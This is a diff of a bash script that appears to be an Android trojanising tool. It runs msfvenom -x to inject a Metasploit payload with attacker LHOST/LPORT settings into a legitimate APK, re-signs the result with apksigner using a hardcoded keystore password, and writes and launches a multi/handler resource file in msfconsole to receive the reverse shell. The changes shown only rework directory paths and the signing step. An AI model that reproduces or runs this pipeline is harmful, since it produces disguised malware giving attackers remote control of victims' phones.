@@ -18,7 +18,7 @@ function ctrl_c () {
         C='\033[1;36m'
         W='\033[0m'
 	TMP_DIR=$HOME/java
-	unsign=$(find $TMP_DIR/unsigned -name "output.apk")
+	unsign=$(find $TMP_DIR/unsign -name "output.apk")
 
 function Banner {
 	echo $(clear)
@@ -109,19 +109,15 @@ function Msfconsole {
 	printf "$C [IbyC]$M Starting msfconsole . . .$W"
                                 echo "
                                 "
-                                        if [ -e $TMP_DIR/.embed/handler.rc ]; then
-                                                rm $TMP_DIR/.embed/handler.rc
-                                        else
-                                                touch $TMP_DIR/.embed/handler.rc
-                                        fi
-					echo "use multi/handler" >> $TMP_DIR/.embed/handler.rc
-					echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/.embed/handler.rc
-					echo "set LHOST $LHOST" >> $TMP_DIR/.embed/handler.rc
-					echo "set LPORT $LPORT" >> $TMP_DIR/.embed/handler.rc
-					echo "run" >> $TMP_DIR/.embed/handler.rc
+				touch $TMP_DIR/handler/$MYAPK.rc
+					echo "use multi/handler" >> $TMP_DIR/handler/$MYAPK.rc
+					echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/handler/$MYAPK.rc
+					echo "set LHOST $LHOST" >> $TMP_DIR/handler/$MYAPK.rc
+					echo "set LPORT $LPORT" >> $TMP_DIR/handler/$MYAPK.rc
+					echo "run" >> $TMP_DIR/handler/$MYAPK.rc
 					echo "
 					"
-                                        msfconsole -q -r $TMP_DIR/.embed/handler.rc
+                                        msfconsole -q -r $TMP_DIR/handler/$MYAPK.rc
 }
 
 echo $(clear)
@@ -171,10 +167,12 @@ printf "$C [IbyC]$M Creating payload . . .$W
 	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
 		
 printf "$C [IbyC]$M Signing the .Apk . . .$W"
-	cd $HOME/
+	cd $HOME/java/unsign
 	sleep 3
-	signapk publickey.x509.pem publickey.pk8 $TMP_DIR/unsigned/output.apk $TMP_DIR/finished/$MYAPK
-	rm $TMP_DIR/unsigned/output.apk
+	apksigner -p Ivam3byCinderella keystore $TMP_DIR/unsign/output.apk $TMP_DIR/finished/$MYAPK
+	sleep 3
+	rm $TMP_DIR/unsign/output.apk
+	cd $HOME
         
 review=$(find $TMP_DIR/finished/ -name "$MYAPK")
 	if [ -z $review ]; then
